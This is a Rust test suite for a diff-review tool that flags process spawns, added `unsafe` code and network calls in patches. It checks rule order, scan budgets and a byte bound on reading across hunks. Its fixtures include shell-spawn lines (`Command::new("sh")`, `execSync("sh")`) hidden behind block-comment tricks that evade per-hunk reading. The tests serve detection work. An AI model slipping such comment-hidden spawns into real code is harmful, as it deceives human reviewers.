            let rust = file.path.rsplit('.').next() == Some("rs");
            let created = file.status == FileStatus::Added;
            // The most scans of a line on one side: eight by the reading of 0.8.3 (twice
            // for each of four readings, as in 0.8.3) and for Rust five more by the lexer
            // reading; and for a line of a creation, the most by the carried reading.
            let side = 8 + if rust { 5 } else { 0 };
            let carried = if rust { 5 } else { 8 };
            let bound: usize = hunks
                .iter()
                .flat_map(|hunk| &hunk.lines)
                .map(|line| match line.kind {
                    PatchLineKind::Context => 2 * side,
                    PatchLineKind::Added => side + if created { carried } else { 0 },
                    PatchLineKind::Removed => side,
                })
                .sum();
            let in_order: Vec<usize> = (0..hunks.len()).collect();
            let reversed: Vec<usize> = in_order.iter().rev().copied().collect();
            for order in [&in_order, &reversed] {
                let mut labels = HunkLabels::naming(&file, order);
                for &index in order {
                    let _ = labels.of(index);
                }
                assert!(
                    labels.scans() <= bound,
                    "{} scans, bound {bound}:\n{text}",
                    labels.scans()
                );
                assert!(labels.views_alive_at_most() <= 1, "{text}");
            }
            // The rank reads the same way.
            let _ = file_evidence(&file);
        }
    }

    /// The rules of a signal are asked in their order until one finds something, as in every
    /// release: on a JavaScript line where the first spawn rule finds `child_process`, the
    /// spawn rules after it are not asked (a rule that was asked all the same built a list of
    /// every `from` on a 30 MB line: 251 MB where 0.8.3 took 118 MB). Counted: a line with
    /// nothing asks every rule of its side once.
    #[test]
    fn the_rules_of_a_signal_are_asked_until_one_finds_something() {
        let asked = |line: &str| {
            let file = added("src/x.js", &[line]);
            let mut labels = HunkLabels::new(&file);
            (labels.of(0), labels.rule_evaluations())
        };
        let kind = FileKind::of(&added("src/x.js", &["x"]));
        let on_side = || {
            RULES
                .iter()
                .filter(|r| kind.admits(r.scope) && r.side == Side::New)
        };
        let (nothing, every) = asked("let x = 1;");
        assert_eq!((nothing, every), (vec![], on_side().count()));
        let spawn: Vec<&Rule> = on_side().filter(|r| r.signal == S::ProcessSpawn).collect();
        let first = spawn
            .iter()
            .position(|r| matches!(r.matches, Match::Tokens(t) if t.contains(&"child_process")))
            .unwrap();
        let not_asked = spawn.len() - 1 - first;
        assert!(
            not_asked > 0,
            "a spawn rule stands after the one that finds it"
        );
        let (found, fewer) = asked("const cp = child_process; from from from");
        assert_eq!(found, [S::ProcessSpawn]);
        assert_eq!(fewer, every - not_asked);
    }

    /// A signal that is found is not asked for again in a later view, counted. A Rust line on
    /// which the reading of 0.8.3 finds `unsafe` and which the lexer reading reads differently
    /// (it has code behind a nested comment): the rules asked are those of the first view,
    /// each signal's until one finds something, and in the lexer view the rules that read
    /// code of every signal but the one found. In a later hunk of a creation that comes into
    /// an open comment there is a third view, and the same holds of it.
    #[test]
    fn a_signal_that_is_found_is_not_asked_for_again_in_a_later_view() {
        let line = "unsafe { g() } /* /* */ // */ let y = 1;";
        let one = added("src/x.rs", &[line]);
        let kind = &FileKind::of(&one);
        let on_side = |signal: EvidenceSignal| {
            RULES
                .iter()
                .filter(move |r| kind.admits(r.scope) && r.side == Side::New && r.signal == signal)
        };
        let finds = |r: &&Rule| matches!(r.matches, Match::Tokens(t) if t.contains(&"unsafe"));
        let found_at = on_side(S::UnsafeAdded).position(|r| finds(&r)).unwrap();
        // The first view: the found signal's rules up to the one that finds, every rule of
        // the others.
        let first: usize = EvidenceSignal::ALL
            .into_iter()
            .map(|signal| match signal {
                S::UnsafeAdded => found_at + 1,
                _ => on_side(signal).count(),
            })
            .sum();
        // A later view: the rules that read code, of every signal but the one found.
        let later: usize = EvidenceSignal::ALL
            .into_iter()
            .filter(|signal| *signal != S::UnsafeAdded)
            .map(|signal| on_side(signal).filter(|r| r.view == View::Code).count())
            .sum();
        assert!(later > 0 && on_side(S::UnsafeAdded).any(|r| r.view == View::Code));
        let mut labels = HunkLabels::new(&one);
        assert_eq!(labels.of(0), [S::UnsafeAdded]);
        assert_eq!(labels.rule_evaluations(), first + later, "two views");
        let file = parse(&format!(
            "--- /dev/null\n+++ b/src/x.rs\n@@ -0,0 +1,1 @@\n+/*\n@@ -0,0 +2,1 @@\n+*/ {line}\n"
        ))
        .unwrap()
        .remove(0);
        let mut labels = HunkLabels::new(&file);
        let _ = labels.of(0);
        let before = labels.rule_evaluations();
        assert_eq!(labels.of(1), [S::UnsafeAdded]);
        assert_eq!(
            labels.rule_evaluations() - before,
            first + 2 * later,
            "three views"
        );
    }

    /// The import rule as it was before it took its keyword hits one at a time: it kept a
    /// list of every hit on the line and sorted it.
    fn imports_module_with_a_list(code: &str, raw: &str, modules: &[&str]) -> bool {
        let c = code.as_bytes();
        let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
            let before = &code[..at];
            let receiver_ok = at == 0
                || !is_boundary_blocker(c[at - 1])
                || (keyword == "require" && before.ends_with("module."));
            let after = at + keyword.len();
            if !receiver_ok
                || c.get(after).is_some_and(|b| is_ident(*b))
                || (keyword == "import" && before.trim_end().ends_with("typeof"))
            {
                return None;
            }
            let gap = c[after..]
                .iter()
                .take_while(|b| b.is_ascii_whitespace() || **b == b'(')
                .count();
            let q = after + gap;
            if keyword == "require" && !c[after..q].contains(&b'(') {
                return None;
            }
            let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
            let name = raw.get(q + 1..)?;
            let name = &name[..name.find(char::from(quote))?];
            Some(name.strip_prefix("node:").unwrap_or(name))
        };
        let mut hits: Vec<(usize, &str)> = ["require", "import", "from"]
            .iter()
            .flat_map(|keyword| code.match_indices(keyword).map(|(at, _)| (at, *keyword)))
            .collect();
        hits.sort_unstable();
        let (mut seen, mut start, mut type_only) = (0, 0, None);
        hits.into_iter().any(|(at, keyword)| {
            if let Some(semi) = code[seen..at].rfind(';') {
                start = seen + semi + 1;
                type_only = None;
            }
            seen = at;
            let skip = *type_only.get_or_insert_with(|| {
                let head = code[start..].trim_start();
                head.starts_with("import type ") || head.starts_with("export type ")
            });
            !skip && specifier_at(at, keyword).is_some_and(|m| modules.contains(&m))
        })
    }

    /// The import rule answers as it did when it kept a list of its hits: 40,000 generated
    /// lines of keywords, quotes, parentheses, statement ends and type-only heads.
    #[test]
    fn the_import_rule_without_a_list_answers_as_with_one() {
        const ATOMS: [&str; 18] = [
            "require",
            "import",
            "from",
            "(",
            " ",
            "'child_process'",
            "\"fs\"",
            "`node:child_process`",
            ";",
            "import type ",
            "export type ",
            "module.",
            "typeof ",
            "x",
            ")",
            "'other'",
            "fromage",
            "\"",
        ];
        let mut seed = 0x1357_9BDF_2468_ACE1_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let mut found = 0;
        for _ in 0..40_000 {
            let line: String = (0..=next(9)).map(|_| ATOMS[next(ATOMS.len())]).collect();
            for modules in [&["child_process"][..], &["fs", "other"][..]] {
                let now = imports_module(&line, &line, modules);
                assert_eq!(
                    now,
                    imports_module_with_a_list(&line, &line, modules),
                    "{line:?}"
                );
                found += usize::from(now);
            }
        }
        assert!(found > 2000, "{found} lines with an import");
    }

    /// What the hunks of a creation cost and what a reader keeps, counted. A file the patch
    /// creates in 3,000 one-line Rust hunks, the first of which opens a comment that only the
    /// last closes: every later hunk comes into something open, so every line but the first
    /// is scanned three times, in file order, in reverse and shuffled alike, and one entry is
    /// kept in file order whatever the number of hunks. Asked for ten hunks in reverse, the
    /// ten labels are kept, eight bytes each, and the hunks between are scanned once, for the
    /// state alone. A hunk behind the reading that was not named is still answered right.
    #[test]
    fn the_hunks_of_a_creation_cost_the_same_in_any_order_and_keep_what_is_asked() {
        use std::fmt::Write as _;
        const HUNKS: usize = 3000;
        let mut text = "--- /dev/null\n+++ b/src/x.rs\n@@ -0,0 +1,1 @@\n+/*\n".to_owned();
        for hunk in 1..HUNKS - 1 {
            let _ = write!(text, "@@ -0,0 +{},1 @@\n+x{hunk}\n", hunk + 1);
        }
        let _ = write!(
            text,
            "@@ -0,0 +{HUNKS},1 @@\n+// */ std::process::Command::new(\"sh\");\n"
        );
        let file = parse(&text).unwrap().remove(0);
        assert_eq!(file.patch_twin.hunks.len(), HUNKS);
        // Asks the hunks in `order` of a reader told the order: the scans, the labels by
        // hunk, the most entries kept at any time and the entries kept at the end.
        let ask = |order: &[usize]| {
            let mut labels = HunkLabels::naming(&file, order);
            let mut got = vec![Vec::new(); HUNKS];
            let mut most = 0;
            for &index in order {
                got[index] = labels.of(index);
                most = most.max(labels.entries_kept());
            }
            assert_eq!(labels.views_alive_at_most(), 1);
            (labels.scans(), got, most, labels.entries_kept())
        };
        let in_order: Vec<usize> = (0..HUNKS).collect();
        let (scans, labels, most, kept) = ask(&in_order);
        assert_eq!(scans, 2 + 3 * (HUNKS - 1), "in file order");
        assert_eq!((most, kept), (1, 1), "in file order, one entry");
        assert_eq!(labels[HUNKS - 1], [EvidenceSignal::ProcessSpawn]);
        assert!(labels[..HUNKS - 1].iter().all(Vec::is_empty));
        assert_eq!(file_evidence(&file).len(), 1);
        let reversed: Vec<usize> = (0..HUNKS).rev().collect();
        let mut shuffled = in_order.clone();
        let mut seed = 0x2545_F491_4F6C_DD1D_u64;
        for at in (1..HUNKS).rev() {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            shuffled.swap(at, usize::try_from(seed % (at as u64 + 1)).unwrap());
        }
        for order in [&reversed, &shuffled] {
            let (scans_so, labels_so, most, kept) = ask(order);
            assert_eq!(scans_so, scans);
            assert!(labels_so == labels && most <= HUNKS && kept == HUNKS);
        }
        // Ten hunks named, in reverse: ten labels kept; the others scanned once each.
        let ten: Vec<usize> = (0..10).map(|k| HUNKS - 1 - 300 * k).collect();
        let (scans_ten, of_ten, most, kept) = ask(&ten);
        assert!(most <= 11 && kept == 10, "{most} {kept}");
        assert_eq!(of_ten[HUNKS - 1], labels[HUNKS - 1]);
        assert_eq!(scans_ten, 10 * 3 + (HUNKS - 10), "ten named of {HUNKS}");
        assert_eq!(std::mem::size_of::<(u32, u16)>(), 8);
        // Not named and behind the reading: the file is gone through again, and the answer
        // is the same.
        let mut unnamed = HunkLabels::new(&file);
        assert_eq!(unnamed.of(HUNKS - 1), labels[HUNKS - 1]);
        assert_eq!(unnamed.of(7), labels[7]);
        assert_eq!(unnamed.of(HUNKS - 1), labels[HUNKS - 1]);
        assert_eq!(unnamed.entries_kept(), 1);
        // The hunks of a file that exists: nothing is kept, in any order.
        let apart = text.replacen("--- /dev/null", "--- a/src/x.rs", 1);
        let file = parse(&apart).unwrap().remove(0);
        let mut alone = HunkLabels::naming(&file, &reversed);
        for &index in &reversed {
            assert_eq!(alone.of(index), []);
            assert_eq!(alone.entries_kept(), 0);
        }
        assert_eq!(alone.scans(), 2 * HUNKS);
    }

    /// A creation in hunks whose every hunk leaves a block comment open, and whose next hunk
    /// closes it behind a line comment before a spawn: the spawn is found only by the reading
    /// carried from hunk to hunk. `kind` 0 and 1 are Rust, 2 and 3 JavaScript; 0 and 2 reach
    /// the bound by their bytes (48 hunks of about 8 KiB), 1 and 3 by a line of 513 bytes in
    /// the middle of hunk 20 (48 hunks of a few hundred bytes). Returns the text and where the
    /// bound is by its definition: the first hunk with a new-side line over 512 bytes or that
    /// takes the new side (each line counted with its end) past 256 KiB.
    fn over_the_bound(kind: usize) -> (String, usize) {
        use std::fmt::Write as _;
        let (path, spawn) = if kind < 2 {
            ("src/x.rs", "std::process::Command::new(\"sh\");")
        } else {
            ("src/x.js", "execSync(\"sh\");")
        };
        let by_bytes = kind.is_multiple_of(2);
        let mut text = format!("--- /dev/null\n+++ b/{path}\n");
        let (mut at, mut bytes) = (1, 0);
        let mut bound = None;
        for hunk in 0..48 {
            let mut lines = vec![format!("// */ {spawn}")];
            let filler = if by_bytes { 100 } else { 3 };
            lines.extend((0..filler).map(|n| format!("let v{hunk}_{n} = {n:<60};")));
            if !by_bytes && hunk == 20 {
                lines.insert(2, format!("let long = {:<501};", 0));
                assert_eq!(lines[2].len(), 513);
            }
            lines.push("let x = 1; /*".to_owned());
            let _ = writeln!(text, "@@ -0,0 +{at},{} @@", lines.len());
            for line in &lines {
                let _ = writeln!(text, "+{line}");
                bytes += line.len() + 1;
                if bound.is_none() && (line.len() > 512 || bytes > 256 * 1024) {
                    bound = Some(hunk);
                }
            }
            at += lines.len();
        }
        let bound = bound.unwrap();
        assert!(bound > 1 && bound < 47, "{bound}");
        (text, bound)
    }

    /// The reading carried from hunk to hunk of a creation stops at its bound, at the same hunk
    /// whatever the hunks are asked in: the rank, in file order, each hunk alone, named in
    /// reverse and shuffled with repeats, and backwards unnamed (going through the file again
    /// for each). Before the bound a hunk that comes into the comment the hunk before it opened
    /// has the spawn; from the bound on every hunk has what it has read alone. And counted: no
    /// request reads more than 256 KiB of lines in the carried reading, and asking for a hunk
    /// past the bound, the last one alone for one, reads none.
    #[test]
    fn the_carried_reading_stops_at_its_bound_whatever_is_asked() {
        for kind in 0..4 {
            let (text, bound) = over_the_bound(kind);
            let file = parse(&text).unwrap().remove(0);
            let hunks = &file.patch_twin.hunks;
            let last = hunks.len() - 1;
            let bytes_of = |hunk: &PatchHunk| -> usize {
                hunk.lines.iter().map(|line| line.text.len() + 1).sum()
            };
            let before: usize = hunks[..bound].iter().map(bytes_of).sum();
            assert_eq!(HunkLabels::new(&file).read_together(), bound, "kind {kind}");
            // The last hunk alone, and the hunk at the bound: nothing carried.
            for index in [last, bound] {
                let mut alone = HunkLabels::new(&file);
                assert_eq!(alone.of(index), [], "kind {kind}, hunk {index}");
                assert_eq!(alone.carried_bytes(), 0, "kind {kind}, hunk {index}");
            }
            // The last hunk before the bound: the hunks before it, and it, once.
            let mut below = HunkLabels::new(&file);
            assert_eq!(below.of(bound - 1), [EvidenceSignal::ProcessSpawn]);
            assert_eq!(below.carried_bytes(), before, "kind {kind}");
            assert!(before <= CARRIED_BYTES, "kind {kind}");
            // Behind the reading: the file again from its top, as far as the hunk asked.
            let carried = below.carried_bytes();
            assert_eq!(below.of(1), [EvidenceSignal::ProcessSpawn]);
            assert_eq!(
                below.carried_bytes() - carried,
                bytes_of(&hunks[0]) + bytes_of(&hunks[1])
            );
            // Every order asks for no more than the bound in one request.
            let in_order: Vec<usize> = (0..hunks.len()).collect();
            let reversed: Vec<usize> = in_order.iter().rev().copied().collect();
            let mut seed = 0x5DEE_CE66_D1CE_4E5B_u64 ^ kind as u64;
            let shuffled: Vec<usize> = (0..2 * hunks.len())
                .map(|_| {
                    seed ^= seed << 13;
                    seed ^= seed >> 7;
                    seed ^= seed << 17;
                    usize::try_from(seed % (hunks.len() as u64)).unwrap()
                })
                .collect();
            for order in [&in_order, &reversed, &shuffled] {
                for named in [true, false] {
                    let mut labels = if named {
                        HunkLabels::naming(&file, order)
                    } else {
                        HunkLabels::new(&file)
                    };
                    for &index in order {
                        let carried = labels.carried_bytes();
                        let got = labels.of(index);
                        let read = labels.carried_bytes() - carried;
                        assert!(read <= CARRIED_BYTES, "kind {kind}, hunk {index}: {read}");
                        if index >= bound {
                            assert_eq!(read, 0, "kind {kind}, hunk {index}");
                        }
                        let spawn = (1..bound).contains(&index);
                        assert_eq!(got.is_empty(), !spawn, "kind {kind}, hunk {index}");
                    }
                    if named {
                        // One pass, as far as the last hunk before the bound.
                        assert!(labels.carried_bytes() <= before, "kind {kind}");
                    }
                }
            }
            // The rank, file order, each hunk alone, named and unnamed in any order: the same
            // labels, and more than alone exactly in the hunks between the first and the bound.
            assert_eq!(
                hunks_with_more_than_alone(&file, &text),
                bound - 1,
                "kind {kind}"
            );
        }
    }

    /// The new-side text of a creation of `path` (Rust, or JavaScript when `path` ends in
    /// `.js`) whose hunk `h` is exactly `sizes[h]` bytes, each line counted with its end: a
    /// line that closes the comment the hunk before left open and then spawns a process,
    /// filler lines of at most 401 bytes (of `§`, two bytes each, when `wide`), and a line
    /// that opens a comment. Only the reading carried from hunk to hunk finds the spawn, in
    /// every hunk read together but the first. At a path in any other language the text is
    /// the Rust one, for the shares alone: they count its bytes, which are the same.
    fn sized_creation(path: &str, sizes: &[usize], wide: bool) -> String {
        use std::fmt::Write as _;
        const LAST: &str = "let x = 1; /*";
        let first = spawn_after_comment(path);
        let mut text = format!("--- /dev/null\n+++ b/{path}\n");
        let mut at = 1;
        for &size in sizes {
            let mut lines = vec![first.to_owned()];
            let mut left = size - (first.len() + 1) - (LAST.len() + 1);
            while left > 0 {
                let line = left.min(401) - 1;
                lines.push(match line {
                    0 => String::new(),
                    1 => "x".to_owned(),
                    _ if wide => {
                        format!("//{}{}", "§".repeat((line - 2) / 2), "a".repeat(line % 2))
                    }
                    _ => format!("//{}", "a".repeat(line - 2)),
                });
                left -= line + 1;
            }
            lines.push(LAST.to_owned());
            let bytes: usize = lines.iter().map(|line| line.len() + 1).sum();
            assert_eq!(bytes, size);
            let _ = writeln!(text, "@@ -0,0 +{at},{} @@", lines.len());
            for line in &lines {
                let _ = writeln!(text, "+{line}");
            }
            at += lines.len();
        }
        text
    }

    /// A line that closes a block comment and then spawns a process, in the language of `path`
    /// (JavaScript for `.js`, Rust otherwise): read alone it is a line comment.
    fn spawn_after_comment(path: &str) -> &'static str {
        if std::path::Path::new(path)
            .extension()
            .is_some_and(|ext| ext == "js")
        {
            "// */ execSync(\"sh\");"
        } else {
            "// */ std::process::Command::new(\"sh\");"
        }
    }

    /// `n` hunks of `each` bytes, and a last one of `last` bytes.
    fn sizes(n: usize, each: usize, last: usize) -> Vec<usize> {
        let mut sizes = vec![each; n];
        sizes.push(last);
        sizes
    }

    /// The edges of the bound, held exactly (each fails if the bound moves by one byte, if a
    /// `>` becomes `>=`, or if characters are counted instead of bytes): a creation of exactly
    /// 256 KiB is read together to its end and one of a byte more is not; a line of exactly
    /// 512 bytes is carried and one of 513 is not, in ASCII and in two-byte characters; and the
    /// labels of the hunks follow.
    #[test]
    fn the_bound_holds_at_its_exact_edges() {
        let together = |text: &str| -> usize {
            let files = parse(text).unwrap();
            let shares = CarriedShares::of(&files);
            let file = &files[0];
            assert_eq!(
                HunkLabels::new(file).read_together(),
                shares.read_together(0)
            );
            shares.read_together(0)
        };
        // 32 hunks: 31 of 8 KiB and a last one that makes 256 KiB exactly, or one byte more.
        for wide in [false, true] {
            let exact = sized_creation("src/x.rs", &sizes(31, 8192, 8192), wide);
            assert_eq!(together(&exact), 32, "exactly 256 KiB, wide {wide}");
            let over = sized_creation("src/x.rs", &sizes(31, 8192, 8193), wide);
            assert_eq!(together(&over), 31, "256 KiB and a byte, wide {wide}");
        }
        // The labels at the byte edge: the last hunk has the spawn only when it is carried.
        for (last, spawn) in [(8192, true), (8193, false)] {
            let text = sized_creation("src/x.rs", &sizes(31, 8192, last), false);
            let file = parse(&text).unwrap().remove(0);
            let expected = if spawn {
                vec![EvidenceSignal::ProcessSpawn]
            } else {
                Vec::new()
            };
            assert_eq!(HunkLabels::new(&file).of(31), expected, "last {last}");
            assert_eq!(
                HunkLabels::new(&file).of(30),
                [EvidenceSignal::ProcessSpawn]
            );
        }
        // A line of 512 bytes, then of 513, in hunk 3 of 6: in ASCII and in two-byte characters
        // (256 and 257 characters).
        for (line, wide, carried) in [
            (512, false, 6),
            (513, false, 3),
            (512, true, 6),
            (513, true, 3),
        ] {
            let long = if wide {
                format!("//{}{}", "§".repeat((line - 2) / 2), "a".repeat(line % 2))
            } else {
                format!("//{}", "a".repeat(line - 2))
            };
            assert_eq!(long.len(), line);
            let text = sized_creation("src/x.rs", &[600; 6], false);
            // Hunk 3's second line (a filler of 401 bytes, end included) becomes the long line.
            let (mut hunk, mut placed) = (0, false);
            let text: String = text
                .lines()
                .map(|l| {
                    hunk += usize::from(l.starts_with("+// */"));
                    if hunk == 4 && !placed && l.len() == 401 && l.starts_with("+//") {
                        placed = true;
                        format!("+{long}\n")
                    } else {
                        format!("{l}\n")
                    }
                })
                .collect();
            assert!(placed, "the long line is placed");
            assert_eq!(together(&text), carried, "line {line}, wide {wide}");
            let file = parse(&text).unwrap().remove(0);
            let spawn = !HunkLabels::new(&file).of(3).is_empty();
            assert_eq!(spawn, carried > 3, "line {line}, wide {wide}");
        }
    }

    /// The created files of a patch share one carried reading of 256 KiB, in patch order: what
    /// one file reads together is taken from what the files after it may, whatever their
    /// languages (the budget crosses into and out of each of Rust, JavaScript, Python, Go,
    /// shell and YAML, so a budget charged for some languages and not others fails).
    /// Held at its edges: the budget used up exactly at a file's end leaves the next file
    /// nothing, one byte inside the next file cuts that file at the hunk the byte is in, and a
    /// file with fewer than two hunks in its share, or not read as one text at all, takes
    /// nothing.
    #[test]
    fn the_created_files_of_a_patch_share_one_bound() {
        for exts in [
            ["rs", "rs", "rs"],
            ["rs", "js", "rs"],
            ["js", "rs", "js"],
            ["rs", "py", "go"],
            ["py", "go", "sh"],
            ["go", "sh", "yml"],
            ["sh", "yml", "js"],
            ["yml", "rs", "py"],
        ] {
            created_files_share_one_bound(exts);
        }
    }

    /// [`the_created_files_of_a_patch_share_one_bound`] with the files A, B and C in the
    /// languages of the extensions `exts`; the files between them that take nothing are in
    /// B's.
    fn created_files_share_one_bound(exts: [&str; 3]) {
        let [a, b, c] = [("a", exts[0]), ("b", exts[1]), ("c", exts[2])]
            .map(|(name, ext)| format!("src/{name}.{ext}"));
        let between_ext = exts[1];
        // A: 32 hunks, all of 8 KiB but the last; B and C: three hunks of 100 bytes.
        let shares_of = |a_last: usize, between: &str| -> Vec<usize> {
            let mut text = sized_creation(&a, &sizes(31, 8192, a_last), false);
            text.push_str(between);
            text.push_str(&sized_creation(&b, &[100; 3], false));
            text.push_str(&sized_creation(&c, &[100; 3], false));
            let files = parse(&text).unwrap();
            let shares = CarriedShares::of(&files);
            (0..files.len()).map(|i| shares.read_together(i)).collect()
        };
        let full = 8192;
        // A takes 256 KiB less 600: B and C read together to their ends.
        assert_eq!(shares_of(full - 600, ""), [32, 3, 3], "{exts:?}");
        // Less 599: C's last hunk is the one the byte is in; it has two hunks still.
        assert_eq!(shares_of(full - 599, ""), [32, 3, 2], "{exts:?}");
        // Less 300: B to its end, C nothing.
        assert_eq!(shares_of(full - 300, ""), [32, 3, 0], "{exts:?}");
        // Less 299: B cut in its last hunk, and C has the 99 bytes left, under one hunk.
        assert_eq!(shares_of(full - 299, ""), [32, 2, 0], "{exts:?}");
        // Less 200: B has two hunks; less 199: one, so it is not read as one text, and
        // takes nothing: C has the 199 bytes, one hunk, and nothing either.
        assert_eq!(shares_of(full - 200, ""), [32, 2, 0], "{exts:?}");
        assert_eq!(shares_of(full - 199, ""), [32, 0, 0], "{exts:?}");
        // A takes exactly 256 KiB: the others nothing. A byte more: A is cut at its last
        // hunk, and B and C share what A's last hunk would have taken.
        assert_eq!(shares_of(full, ""), [32, 0, 0], "{exts:?}");
        assert_eq!(shares_of(full + 1, ""), [31, 3, 3], "{exts:?}");
        // Files that are not read as one text take nothing: a file that exists, a creation in
        // one hunk, a creation whose first hunk has a line over 512 bytes, and a creation in
        // a language no rule reads.
        let modified = "--- a/src/m.rs\n+++ b/src/m.rs\n@@ -1,1 +1,2 @@\n x\n+y\n";
        let one_hunk = sized_creation(&format!("src/one.{between_ext}"), &[300_000], false);
        let long_first = format!(
            "--- /dev/null\n+++ b/src/long.{between_ext}\n@@ -0,0 +1,1 @@\n+//{}\n@@ -0,0 +2,1 @@\n+x\n",
            "a".repeat(600)
        );
        let no_rules =
            "--- /dev/null\n+++ b/notes.unknown-kind\n@@ -0,0 +1,1 @@\n+a\n@@ -0,0 +2,1 @@\n+b\n";
        let between = format!("{modified}{one_hunk}{long_first}{no_rules}");
        let shares = shares_of(full - 600, &between);
        assert_eq!(shares, [32, 0, 0, 0, 0, 3, 3], "{exts:?}");
        // A creation whose first hunk fits in what is left and whose second does not has one
        // hunk in its share: it is not read as one text and takes nothing, so B after it still
        // has the 300 bytes left.
        let one_fits = sized_creation(&format!("src/one_fits.{between_ext}"), &[100, 250], false);
        assert_eq!(shares_of(full - 300, &one_fits), [32, 0, 3, 0], "{exts:?}");
    }

    /// One request reads at most 256 KiB in the carried reading, whatever it asks: the rank of
    /// a patch of 24 creations, Rust and JavaScript in turn, each of about 64 KiB and under
    /// every limit of a file of its own, reads exactly the shares of the first four (counted
    /// on the thread, whatever readers it makes), and labels every hunk as its share says; one
    /// reader for each file, asked in reverse with its share, reads no more.
    #[test]
    fn one_request_reads_at_most_the_bound_in_all() {
        let mut text = String::new();
        for f in 0..24 {
            let ext = if f % 2 == 0 { "rs" } else { "js" };
            text.push_str(&sized_creation(
                &format!("src/f{f}.{ext}"),
                &[4096; 16],
                false,
            ));
        }
        let files = parse(&text).unwrap();
        let shares = CarriedShares::of(&files);
        let wanted: Vec<usize> = (0..24).map(|f| if f < 4 { 16 } else { 0 }).collect();
        let got: Vec<usize> = (0..24).map(|f| shares.read_together(f)).collect();
        assert_eq!(got, wanted);
        for file in &files {
            assert_eq!(
                HunkLabels::new(file).read_together(),
                16,
                "as its patch's only file"
            );
        }
        // The first hunk of a file comes into nothing open, and is not read in the carried
        // reading; the other 15 of each of the four files are, once.
        let once = CARRIED_BYTES - 4 * 4096;
        let before = carried_bytes_on_this_thread();
        let ranked = crate::rank(&files);
        assert_eq!(carried_bytes_on_this_thread() - before, once);
        for (f, file) in files.iter().enumerate() {
            let listed = ranked.iter().find(|r| r.path == file.path).unwrap();
            for (h, hunk) in file.patch_twin.hunks.iter().enumerate() {
                let has = listed.evidence.iter().any(|e| e.hunk == hunk.id);
                assert_eq!(has, (1..wanted[f]).contains(&h), "file {f} hunk {h}");
            }
        }
        let before = carried_bytes_on_this_thread();
        let reversed: Vec<usize> = (0..16).rev().collect();
        for (f, file) in files.iter().enumerate() {
            let mut labels = HunkLabels::in_patch(file, &shares, f, &reversed);
            for &h in &reversed {
                let spawn = labels.of(h) == [EvidenceSignal::ProcessSpawn];
                assert_eq!(spawn, (1..wanted[f]).contains(&h), "file {f} hunk {h}");
            }
        }
        assert_eq!(carried_bytes_on_this_thread() - before, once);
        // Each hunk of each file alone, a reader each: at most one file's share each.
        for (f, file) in files.iter().enumerate() {
            for h in 0..16 {
                let before = carried_bytes_on_this_thread();
                let _ = HunkLabels::in_patch(file, &shares, f, &[]).of(h);
                let read = carried_bytes_on_this_thread() - before;
                assert!(
                    read <= 16 * 4096 && (f < 4 || read == 0),
                    "file {f} hunk {h}: {read}"
                );
            }
        }
    }

    /// At the bound, the list of a file the patch creates in several hunks holds every item
    /// 0.8.3 would list, though the reading carried from hunk to hunk finds more: 300
    /// generated creations of 40 to 100 lines, cut into hunks at random, with comments left
    /// open at the cuts.
    #[test]
    fn the_bounded_list_of_a_creation_in_hunks_holds_every_item_0_8_3_listed() {
        use std::fmt::Write as _;
        const TOKENS: [&str; 4] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\");",
            "let _ = reqwest::blocking::get(u);",
            "let x = 1;",
        ];
        let mut seed = 0x0DDB_1A5E_5BAD_5EED_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let (mut cut, mut carried) = (0, 0);
        for _ in 0..300 {
            let lines = 40 + next(61);
            let mut text = "--- /dev/null\n+++ b/src/x.rs\n".to_owned();
            let mut at = 0;
            while at < lines {
                let take = (1 + next(6)).min(lines - at);
                let _ = writeln!(text, "@@ -0,0 +{},{take} @@", at + 1);
                for line in 0..take {
                    let token = TOKENS[next(TOKENS.len())];
                    let _ = match (line + 1 == take, next(8)) {
                        // the last line of a hunk often leaves a comment open
                        (true, 0..=3) => writeln!(text, "+{token} /*"),
                        // and a line often closes one behind a line comment
                        (_, 4..=5) => writeln!(text, "+// */ {token}"),
                        _ => writeln!(text, "+{token}"),
                    };
                }
                at += take;
            }
            let file = parse(&text).unwrap().remove(0);
            let (is_cut, _) = bounded_list_holds(&file, &text);
            cut += usize::from(is_cut);
            let (_, marks) = file_evidence_marked(&file, Share::Own);
            carried += marks.iter().filter(|released| !**released).count();
        }
        assert!(
            cut > 100 && carried > 300,
            "{cut} lists cut, {carried} further items"
        );
    }

    /// For each hunk of `file`: every item it has when it is read alone is an item of the file,
    /// and its labels are the file's whether the hunks are asked in order, one at a time or
    /// backwards. Returns how many hunks have more items in the file than alone.
    fn hunks_with_more_than_alone(file: &ReviewFile, text: &str) -> usize {
        let hunks = &file.patch_twin.hunks;
        let kind = FileKind::of(file);
        let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
        let evidence = file_evidence(file);
        let of_file = |hunk: &PatchHunk| -> Vec<_> {
            evidence
                .iter()
                .filter(|e| e.hunk == hunk.id)
                .map(|e| (e.side, e.signal, e.line))
                .collect()
        };
        let mut more = 0;
        let mut in_order = HunkLabels::new(file);
        for (index, hunk) in hunks.iter().enumerate() {
            let of_file = of_file(hunk);
            let alone = hunk_matches(hunk, kind.language, &rules);
            for item in &alone {
                assert!(of_file.contains(item), "{item:?} of hunk {index}:\n{text}");
            }
            more += usize::from(of_file.len() > alone.len());
            let labels = distinct(&of_file);
            assert_eq!(
                in_order.of(index),
                labels,
                "in order, hunk {index}:\n{text}"
            );
            assert_eq!(HunkLabels::new(file).of(index), labels, "one hunk:\n{text}");
            assert_eq!(hunk_signals(file, hunk), distinct(&alone), "alone:\n{text}");
        }
        let mut backwards = HunkLabels::new(file);
        for index in (0..hunks.len()).rev() {
            let labels = distinct(&of_file(&hunks[index]));
            assert_eq!(backwards.of(index), labels, "backwards:\n{text}");
        }
        // In any order, a hunk more than once: three asks for each hunk, drawn at random, of
        // a reader that was told the order (it keeps the labels) and of one that was not (it
        // goes through the file again when asked for a hunk behind it).
        let mut seed = 0x9E37_79B9_7F4A_7C15_u64 ^ (text.len() as u64);
